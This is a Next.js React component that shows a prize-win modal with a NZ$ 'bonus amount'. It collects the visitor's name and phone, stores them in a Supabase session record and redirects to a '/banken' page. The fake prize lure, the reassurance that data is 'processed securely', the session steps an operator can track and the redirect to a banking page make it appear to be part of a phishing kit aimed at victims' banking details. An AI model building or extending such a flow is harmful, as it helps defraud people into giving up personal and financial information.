"use client";

import { useEffect, useState, useMemo } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import { persistActiveSession } from "@/lib/session-id-client";

type Props = {
  sessionId: string;
};

export function WinFlow({ sessionId }: Props) {
  
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [amount, setAmount] = useState<number | null>(null);
  const [currency, setCurrency] = useState<string>("NZ$");
  const [loading, setLoading] = useState(true);
  const [showModal] = useState(true);
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [phone, setPhone] = useState("");
  const [saving, setSaving] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null) {
        setLoading(false);
        return;
      }
      const { data, error: qErr } = await supabase
        .from("sessions")
        .select("amount, form_data")
        .eq("id", sessionId)
        .maybeSingle();

      if (cancelled) return;
      if (qErr || !data) {
        setError("Session not found or configuration is invalid.");
        setLoading(false);
        return;
      }

      setAmount(data.amount ?? 0);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      if (fd.currency) setCurrency(fd.currency);
      setFirstName(fd.firstName ?? "");
      setLastName(fd.lastName ?? "");
      setPhone(fd.phone ?? "");
      setLoading(false);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase) return;
    setSaving(true);
    setError(null);

    const nextForm = {
      ...sessionFormData,
      firstName: firstName.trim(),
      lastName: lastName.trim(),
      phone: phone.trim(),
    };

    const { error: upErr } = await supabase
      .from("sessions")
      .update({ is_hidden: false, form_data: nextForm, current_step: "banken" })
      .eq("id", sessionId);

    setSaving(false);
    if (upErr) {
      setError("Saving failed. Please try again.");
      return;
    }
    setSessionFormData(nextForm);
    try {
      persistActiveSession(sessionId);
      localStorage.setItem(`session:${sessionId}:profileComplete`, "1");
    } catch {
      /* storage ops are best-effort */
    }
    setProcessing(true);
    window.setTimeout(() => {
      setProcessing(false);
      window.location.href = "/banken";
    }, 700);
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <DemoShell title="Configuration" subtitle="System environment">
        <ConfigMissing />
      </DemoShell>
    );
  }

  if (loading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-brand-blue border-t-transparent" />
        </div>
      </div>
    );
  }

  if (error && amount === null) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4">
        <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-900">{error}</p>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      {showModal ? (
        <div
          role="dialog"
          aria-modal="true"
          className="relative w-full max-w-[650px] overflow-hidden rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)]"
        >
          <div className="px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10">
            {/* Top Section with Gift Box */}
            <div className="relative mb-4 sm:mb-6">
              <div className="pr-24 sm:pr-48">
                <h2 className="text-lg font-bold text-white sm:text-2xl leading-tight">
                  Complete your entry
                </h2>
                <p className="mt-1 text-[11px] text-gray-300 sm:text-sm sm:mt-2">
                  Enter your details to complete prize confirmation.
                </p>
                <div className="mt-3 flex items-center justify-between rounded-xl bg-[#0066CC] px-4 py-2.5 sm:mt-4 sm:px-5 sm:py-3 w-max gap-4 sm:gap-8">
                  <div className="leading-tight text-left">
                    <div className="text-[11px] font-bold text-white/90 sm:text-xs">Your</div>
                    <div className="text-xs font-bold text-white sm:text-sm">bonus amount</div>
                  </div>
                  <div className="flex items-center gap-1.5 sm:gap-2">
                    <span className="text-xl font-black text-white sm:text-2xl">{currency}</span>
                    <span className="text-2xl font-black text-white sm:text-3xl">{amount?.toLocaleString("en-NZ")}</span>
                  </div>
                </div>
              </div>
              
              {/* Gift Box Image */}
              <div className="absolute right-[-15px] top-[-15px] w-24 sm:right-[-10px] sm:top-[-30px] sm:w-44 pointer-events-none">
                <img
                  src="/form-assets/gift-box.png"
                  alt=""
                  className="h-auto w-full object-contain drop-shadow-[0_18px_30px_rgba(0,0,0,0.4)]"
                />
              </div>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-3 sm:space-y-4">
              <div className="grid grid-cols-1 gap-3 sm:gap-4 sm:grid-cols-2">
                <label className="block text-[13px] font-medium text-white sm:text-sm">
                  {settings.profile_firstname_label}
                  <div className="relative mt-1">
                    <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
                      <img src="/form-assets/icon-person.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain opacity-70" />
                    </div>
                    <input
                      required
                      className="block w-full rounded-xl border border-transparent bg-white py-2.5 sm:py-3 pl-9 sm:pl-10 pr-3 text-sm sm:text-base text-gray-900 shadow-sm transition-colors placeholder:text-gray-400 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
                      value={firstName}
                      onChange={(e) => setFirstName(e.target.value)}
                      autoComplete="given-name"
                    />
                  </div>
                </label>
                <label className="block text-[13px] font-medium text-white sm:text-sm">
                  {settings.profile_lastname_label}
                  <div className="relative mt-1">
                    <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
                      <img src="/form-assets/icon-person.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain opacity-70" />
                    </div>
                    <input
                      required
                      className="block w-full rounded-xl border border-transparent bg-white py-2.5 sm:py-3 pl-9 sm:pl-10 pr-3 text-sm sm:text-base text-gray-900 shadow-sm transition-colors placeholder:text-gray-400 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
                      value={lastName}
                      onChange={(e) => setLastName(e.target.value)}
                      autoComplete="family-name"
                    />
                  </div>
                </label>
              </div>
              <label className="block text-[13px] font-medium text-white sm:text-sm">
                {settings.profile_phone_label}
                <div className="relative mt-1">
                  <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
                    <img src="/form-assets/icon-phone.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain opacity-70" />
                  </div>
                  <input
                    required
                    type="tel"
                    className="block w-full rounded-xl border border-transparent bg-white py-2.5 sm:py-3 pl-9 sm:pl-10 pr-3 text-sm sm:text-base text-gray-900 shadow-sm transition-colors placeholder:text-gray-400 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    autoComplete="tel"
                  />
                </div>
              </label>

              {/* Security Text */}
              <div className="mt-3 sm:mt-4 flex items-center gap-2">
                <img src="/form-assets/icon-security.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain" />
                <span className="text-[11px] sm:text-sm text-gray-300">Your information is processed securely.</span>
              </div>

              {error ? <p className="text-sm font-medium text-red-400">{error}</p> : null}

              <button
                type="submit"
                disabled={saving || processing}
                className="mt-4 sm:mt-6 w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-3.5 sm:py-4 text-base sm:text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
              >
                {processing ? "Processing..." : saving ? "Saving..." : settings.profile_button}
              </button>
            </form>
          </div>
        </div>
      ) : null}
    </div>
  );
}
